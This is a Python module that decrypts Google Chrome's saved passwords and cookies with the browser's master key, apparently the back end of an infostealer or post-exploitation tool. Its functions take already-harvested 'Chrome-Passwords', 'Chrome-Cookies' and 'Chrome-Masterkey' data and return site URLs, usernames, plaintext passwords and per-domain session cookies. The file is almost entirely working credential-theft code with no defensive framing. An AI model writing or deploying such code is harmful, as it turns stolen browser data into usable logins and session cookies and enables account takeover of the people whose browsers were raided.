from Cryptodome.Cipher import AES

_CHROME_PRODUCT = {
    "Passwords": [],
    "Cookies": []
}


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(chrome_master_key, iv):
    return AES.new(chrome_master_key, AES.MODE_GCM, iv)


def decrypt_cipher(encrypted_password, chrome_master_key):
    try:
        encrypted_password = bytes.fromhex(encrypted_password)
        chrome_master_key = bytes.fromhex(chrome_master_key)
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = generate_cipher(chrome_master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except:
        return "Unknown"


def handle_chrome_passwords(creds_arr: list, chrome_master_key: str) -> list:
    chrome_passwords = []
    for num in creds_arr:
        creds_json = creds_arr.get(num)
        enc_password = creds_json[2].get('password')
        plaint_text_pass = decrypt_cipher(enc_password, chrome_master_key)
        plaint_text_pass and chrome_passwords.append(
            {"url": creds_json[0].get('url'), "username": creds_json[1].get('username'), "passwords": plaint_text_pass})
    return chrome_passwords


def handle_chrome_cookies(cookies_arr: list, chrome_master_key: str) -> list:
    chrome_cookies = []
    for cookie_obj in cookies_arr:
        cookie_domain = cookie_obj.get("Domain")
        enc_cookie = cookie_obj.get("Value")
        plaint_text_cookie = decrypt_cipher(enc_cookie, chrome_master_key=chrome_master_key)
        chrome_cookies.append({"domain": cookie_domain, "cookie": plaint_text_cookie})
    return chrome_cookies

def handle_all_chrome_modules(results: dict) -> dict:
    chrome_product = _CHROME_PRODUCT
    chrome_passwords = results.get("Chrome-Passwords")
    chrome_master_key = results.get("Chrome-Masterkey")
    chrome_product["Passwords"] = handle_chrome_passwords(chrome_passwords, chrome_master_key)
    chrome_cookies = results.get("Chrome-Cookies")
    chrome_product["Cookies"] = handle_chrome_cookies(chrome_cookies, chrome_master_key)
    return chrome_product
